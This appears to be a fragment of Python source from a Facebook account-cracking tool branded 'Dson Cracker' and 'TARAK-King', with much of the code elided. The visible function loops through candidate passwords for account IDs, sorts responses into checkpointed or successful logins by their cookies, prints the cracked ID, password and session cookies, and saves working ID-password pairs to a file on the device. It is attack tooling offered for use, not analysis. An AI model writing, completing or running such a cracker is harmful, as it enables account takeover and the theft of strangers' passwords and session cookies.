...
def passwrd():
	...
	print("\033[1;92m  [~] Cloning Speed Super Fast")
	print("\033[1;92m  [~] Welcome To Tool Dson Cracker")
	TARAKj(f'\033[0;97m===============================================')
	...
	for pw in pwv:
		try:
			...
			if "checkpoint" in po.cookies.get_dict().keys():
				#TARAK-King
				print(f'\r\033[0;94m[{time.strftime("%H:%M")}•DSON-CP💔] {idf} • {pw}')     
				...
				#TARAK-King
				print(f'\r\033[0;92m[{time.strftime("%H:%M")}•DSON-Ok🖤] {idf} • {pw}\n\033[0;93m[🖤]= COOKIES •\x1b[1;91m{kuki} ')
				print('\x1b[1;91m==============================================================')
				os.system('espeak -a 300 " TARAK,  Ok,  id"')
				open(' /sdcard/TARAK-OK.txt','a').write(idf+'|'+pw+'\n')
